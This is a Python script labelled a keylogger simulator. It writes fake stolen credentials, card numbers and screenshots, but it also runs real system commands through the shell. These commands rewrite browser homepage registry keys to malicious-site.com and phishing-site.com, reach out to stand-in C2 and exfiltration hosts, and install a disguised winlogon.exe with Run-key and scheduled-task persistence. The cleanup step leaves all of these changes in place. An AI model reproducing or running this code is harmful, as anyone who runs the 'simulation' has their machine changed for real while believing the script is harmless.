import os
import time
import threading
import subprocess
import random
import string
import shutil
from pathlib import Path


class KeyloggerSimulator:

    def __init__(self):
        self.temp_dir = Path.cwd() / 'temp_keylogger'
        self.temp_dir.mkdir(exist_ok=True)
        self.running = False

    def simulate_keylogger_installation(self):
        print('Simulating keylogger installation...')
        keylogger_files = ['winlogon.exe', 'svchost.exe', 'explorer.exe',
            'system32.dll', 'kernel32.dll', 'user32.dll']
        for filename in keylogger_files:
            try:
                fake_file = self.temp_dir / filename
                shutil.copy('C:\\Windows\\System32\\notepad.exe', fake_file)
                print(f'Installed: {filename}')
                time.sleep(0.5)
            except Exception:
                fake_file = self.temp_dir / filename
                fake_file.write_bytes(b'FAKE_KEYLOGGER_BINARY' * 100)

    def simulate_keystroke_capture(self):
        print('Simulating keystroke capture...')
        keylog_file = self.temp_dir / 'keylog.dat'
        fake_keystrokes = ['[WINDOW: Banking Login]',
            'username: john.doe@email.com', 'password: MySecretPass123!',
            '[WINDOW: Credit Card Form]',
            'card_number: 4532-1234-5678-9012', 'cvv: 123', 'expiry: 12/25',
            '[WINDOW: Social Media]',
            'status_update: Just logged into my bank account',
            '[WINDOW: Email Client]', 'email_to: boss@company.com',
            'subject: Confidential Project Data',
            'body: Attached are the classified documents...']
        with open(keylog_file, 'w') as f:
            for keystroke in fake_keystrokes:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {keystroke}\n"
                    )
                time.sleep(0.1)

    def simulate_screen_capture(self):
        print('Simulating screen capture...')
        screenshots_dir = self.temp_dir / 'screenshots'
        screenshots_dir.mkdir(exist_ok=True)
        for i in range(5):
            screenshot_file = screenshots_dir / f'screen_{i:03d}.jpg'
            fake_image_data = b'FAKE_SCREENSHOT_DATA' * 1000
            screenshot_file.write_bytes(fake_image_data)
            print(f'Captured screenshot: {screenshot_file.name}')
            time.sleep(1)

    def simulate_clipboard_monitoring(self):
        print('Simulating clipboard monitoring...')
        clipboard_file = self.temp_dir / 'clipboard.log'
        fake_clipboard_data = ['Copied password: admin123',
            'Copied credit card: 4532123456789012',
            'Copied email: confidential@company.com',
            'Copied document: TOP_SECRET_PROJECT.docx',
            'Copied URL: https://banking.secure-site.com/login']
        with open(clipboard_file, 'w') as f:
            for data in fake_clipboard_data:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {data}\n")
                time.sleep(0.5)

    def simulate_browser_hijacking(self):
        print('Simulating browser hijacking...')
        try:
            hijack_commands = [
                'reg add "HKCU\\Software\\Microsoft\\Internet Explorer\\Main" /v "Start Page" /t REG_SZ /d "http://malicious-site.com" /f'
                ,
                'reg add "HKCU\\Software\\Google\\Chrome\\PreferenceMACs\\Default\\homepage" /v "homepage" /t REG_SZ /d "http://phishing-site.com" /f'
                ]
            for cmd in hijack_commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True)
                    print('Browser settings modified')
                    time.sleep(1)
                except Exception:
                    pass
        except Exception as e:
            print(f'Browser hijacking failed: {e}')

    def simulate_network_communication(self):
        print('Simulating malicious network communication...')
        try:
            network_commands = ['nslookup malware-c2.darkweb.onion',
                'ping 192.168.1.100', 'telnet suspicious-server.com 4444',
                'ftp anonymous@data-exfil.com']
            for cmd in network_commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True,
                        timeout=3)
                    print(f'Network communication: {cmd}')
                    time.sleep(1)
                except Exception:
                    pass
        except Exception as e:
            print(f'Network communication failed: {e}')

    def simulate_data_theft(self):
        print('Simulating data theft...')
        stolen_data_dir = self.temp_dir / 'stolen_data'
        stolen_data_dir.mkdir(exist_ok=True)
        sensitive_files = [('passwords.txt',
            'admin:password123\nuser:mypass456\nroot:secret789'), (
            'credit_cards.csv',
            """Name,Number,CVV,Expiry
John Doe,4532123456789012,123,12/25"""
            ), ('personal_info.json',
            '{"ssn":"123-45-6789","dob":"1990-01-01","address":"123 Main St"}'
            ), ('browser_history.log',
            """https://banking.com
https://paypal.com
https://amazon.com"""
            ), ('email_contacts.txt',
            """boss@company.com
client@business.org
friend@personal.net""")]
        for filename, content in sensitive_files:
            stolen_file = stolen_data_dir / filename
            stolen_file.write_text(content)
            print(f'Stole: {filename}')
            time.sleep(0.5)

    def simulate_persistence_installation(self):
        print('Simulating persistence mechanisms...')
        try:
            persistence_script = self.temp_dir / 'persistence.bat'
            persistence_content = """
@echo off
echo Keylogger persistence activated
copy "%~dp0winlogon.exe" "C:\\Windows\\Temp\\winlogon.exe"
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsLogon" /t REG_SZ /d "C:\\Windows\\Temp\\winlogon.exe" /f
schtasks /create /tn "SystemLogon" /tr "C:\\Windows\\Temp\\winlogon.exe" /sc onlogon /f
"""
            persistence_script.write_text(persistence_content)
            subprocess.run(str(persistence_script), shell=True,
                capture_output=True)
            print('Persistence mechanisms installed')
        except Exception as e:
            print(f'Persistence installation failed: {e}')

    def cleanup(self):
        print('Cleaning up keylogger simulation...')
        shutil.rmtree(self.temp_dir)
        print('Cleanup complete')

    def run_simulation(self):
        self.running = True
        simulation_steps = [self.simulate_keylogger_installation, self.
            simulate_keystroke_capture, self.simulate_screen_capture, self.
            simulate_clipboard_monitoring, self.simulate_browser_hijacking,
            self.simulate_network_communication, self.simulate_data_theft,
            self.simulate_persistence_installation]
        for step in simulation_steps:
            if not self.running:
                break
            step()
            time.sleep(2)
        print('Keylogger simulation finished')
        self.cleanup()

    def stop_simulation(self):
        self.running = False


if __name__ == '__main__':
    simulator = KeyloggerSimulator()
    simulation_thread = threading.Thread(target=simulator.run_simulation)
    simulation_thread.start()
    try:
        while simulation_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print('\nStopping keylogger simulation...')
        simulator.stop_simulation()
        simulation_thread.join()
        print('Simulation stopped by user')
